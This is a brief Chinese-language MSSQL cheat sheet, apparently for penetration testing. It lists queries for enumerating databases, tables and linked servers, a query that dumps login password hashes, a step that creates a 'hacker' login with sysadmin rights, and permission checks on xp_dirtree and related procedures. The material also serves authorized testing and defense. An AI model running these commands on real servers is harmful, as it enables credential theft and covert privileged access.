sql语句

mssql

```
获取版本
select @@version;
获取用户
select user_name();
获取数据库
SELECT name FROM master.dbo.sysdatabases;
使用数据库
USE master

获取表名
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
列出链接服务器
EXEC sp_linkedservers
SELECT * FROM sys.servers;
获取用户
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
创建具有sysadmin
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

检查是否有权限执行这些代码  

Use master;

EXEC sp_helprotect 'xp_dirtree';    \\显示当前目录的子目录

EXEC sp_helprotect 'xp_subdirs';    \\获取指定目录下的目录列表

EXEC sp_helprotect 'xp_fileexist';  \\判断文件是否存在
```

